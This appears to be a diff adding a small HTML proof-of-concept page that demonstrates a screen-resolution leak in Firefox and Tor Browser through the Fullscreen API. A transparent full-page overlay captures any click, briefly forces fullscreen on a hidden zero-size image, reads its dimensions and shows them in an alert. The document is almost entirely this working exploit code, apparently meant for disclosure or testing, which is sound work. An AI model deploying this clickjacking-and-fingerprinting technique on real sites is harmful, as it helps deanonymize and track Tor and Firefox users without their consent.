@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<style>
+		#cjack {position:absolute;top:0;right:0;bottom:0;left:0;z-index:1000;}
+	</style>
+</head>
+<body>
+<h2>Firefox & TBB Fullscreen API screen-resolution leak</h2>
+<h3>&nbsp;</h3>
+<img width=0 height=0 id="myimg">
+<div id="cjack" onclick="goFullScreen()"></div>
+<script>
+var hdr = document.getElementsByTagName("h3")[0];
+var el = document.getElementById("myimg");
+hdr.innerText = (document.mozFullScreenEnabled) ? "click anywhere to trigger the leak" : "You're not using Firefox or you've disabled the Fullscreen API";
+function goFullScreen() { if (!document.mozFullScreen && el.mozRequestFullScreen) el.mozRequestFullScreen(); }
+document.addEventListener("mozfullscreenchange", function(evnt) {
+    if ( document.mozFullScreen ) {
+        let winW = document.mozFullScreenElement.clientWidth, winH = document.mozFullScreenElement.clientHeight;
+        document.mozCancelFullScreen();
+        //document.getElementById("cjack").setAttribute("hidden","true");
+        alert(winW+"x"+winH);
+    }
+});
+</script>
+</body>
+</html>
